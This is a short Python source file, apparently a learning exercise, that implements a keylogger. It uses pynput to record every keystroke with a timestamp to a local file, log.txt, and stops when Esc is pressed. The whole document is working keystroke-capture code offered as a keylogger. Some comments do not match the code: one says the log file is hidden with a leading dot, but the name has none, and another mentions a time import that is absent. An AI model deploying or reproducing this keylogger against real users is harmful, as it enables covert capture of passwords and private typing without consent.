"""
Python Keylogger
Author: Carlos Navarro-Montanez
Date: 11/13/2025
"""
#Import pynput library for keyboard event handling
#Time to mark timestamps
#Logging for recording keystrokes
import pynput.keyboard
import logging

#Define hidden log file name with the use of '.' to make it hidden
log_name = "log.txt"

#Configure logging to write keystrokes to the log file with timestamps
logging.basicConfig(filename=log_name, level=logging.DEBUG, format='%(asctime)s: %(message)s')

#Functgion for handling key press events
def on_press(key):
    key_data = str(key)
    logging.info(key_data)

#Function for handling key release events
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False
    
#Setting up the listener for keyboard events
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()